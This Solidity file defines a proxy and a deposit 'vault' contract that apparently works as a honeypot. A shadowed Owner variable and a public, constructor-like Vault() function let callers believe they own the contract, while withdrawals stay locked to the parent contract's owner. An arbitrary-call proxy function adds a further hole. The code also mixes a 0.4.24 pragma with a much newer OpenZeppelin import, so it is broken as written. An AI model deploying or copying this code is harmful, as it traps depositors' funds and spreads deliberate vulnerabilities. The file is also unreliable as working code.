// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";


contract Proxy   is ReentrancyGuard {
    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function transferOwner(address _owner) public onlyOwner { Owner = _owner; }
    function proxy(address target, bytes data) public payable nonReentrant {
        target.call.value(msg.value)(data);
    }
}

contract DepositProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function Vault() public payable nonReentrant {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            deposit();
        }
    }

    function deposit() public payable nonReentrant {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function withdraw(uint256 amount) public onlyOwner nonReentrant {
        if (amount>0 && Deposits[msg.sender]>=amount) {
            msg.sender.transfer(amount);
        }
    }
}